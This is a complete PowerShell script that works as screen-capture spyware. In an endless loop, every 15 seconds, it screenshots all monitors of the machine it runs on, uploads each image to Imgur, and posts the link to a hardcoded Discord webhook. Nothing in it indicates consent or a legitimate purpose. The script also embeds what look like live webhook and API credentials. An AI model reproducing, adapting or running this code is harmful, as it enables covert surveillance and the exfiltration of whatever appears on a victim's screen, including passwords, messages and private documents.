function Capture-Screenshot {
    param (
        [string]$OutputFilePath
    )

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    try {
        $screens = [System.Windows.Forms.Screen]::AllScreens

        $top    = ($screens | ForEach-Object { $_.Bounds.Top }    | Measure-Object -Minimum).Minimum
        $left   = ($screens | ForEach-Object { $_.Bounds.Left }   | Measure-Object -Minimum).Minimum
        $width  = ($screens | ForEach-Object { $_.Bounds.Right }  | Measure-Object -Maximum).Maximum
        $height = ($screens | ForEach-Object { $_.Bounds.Bottom } | Measure-Object -Maximum).Maximum

        $bounds   = [System.Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
        $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.Width), ([int]$bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)

        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

        $bmp.Save($OutputFilePath)
        Write-Host "Screenshot captured and saved at: $OutputFilePath"
    }
    catch {
        Write-Host "Error occurred while capturing screenshot: $_"
    }
    finally {
        if ($graphics) { $graphics.Dispose() }
        if ($bmp) { $bmp.Dispose() }
    }
}

function Upload-ToImgur {
    param (
        [string]$ImageFilePath,
        [string]$ClientId
    )

    try {
        $base64Image = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($ImageFilePath))
        $headers = @{
            Authorization = "Client-ID $ClientId"
        }
        $body = @{
            image = $base64Image
        }

        $response = Invoke-RestMethod -Uri "https://api.imgur.com/3/image" -Method Post -Headers $headers -Body $body
        $imageUrl = $response.data.link
        return $imageUrl
    }
    catch {
        Write-Host "Error occurred while uploading image to Imgur: $_"
        return $null
    }
}

function Send-DiscordMessage {
    param (
        [string]$WebhookUrl,
        [string]$ImageUrl
    )

    try {
        $payload = @{
            content = "Screenshot"
            embeds = @(
                @{
                    title = "Screenshot"
                    image = @{
                        url = $ImageUrl
                    }
                }
            )
        }

        $body = $payload | ConvertTo-Json -Depth 5  

        $headers = @{
            'Content-Type' = 'application/json'
        }

        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
    }
    catch {
        Write-Host "Error occurred while sending Discord message: $_"
    }
}

$discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"
$imgurClientId = "ffd17df3bb7faec"

while ($true) {
    $outputFilePath = "$env:temp\$env:computername-Capture.png"
    Capture-Screenshot -OutputFilePath $outputFilePath
    
    $imageUrl = Upload-ToImgur -ImageFilePath $outputFilePath -ClientId $imgurClientId
    if ($imageUrl) {
        Write-Host "Image uploaded to Imgur: $imageUrl"
        Send-DiscordMessage -WebhookUrl $discordWebhookUrl -ImageUrl $imageUrl
    }
    else {
        Write-Host "Failed to upload image to Imgur."
    }
    
    Start-Sleep -Seconds 15
}
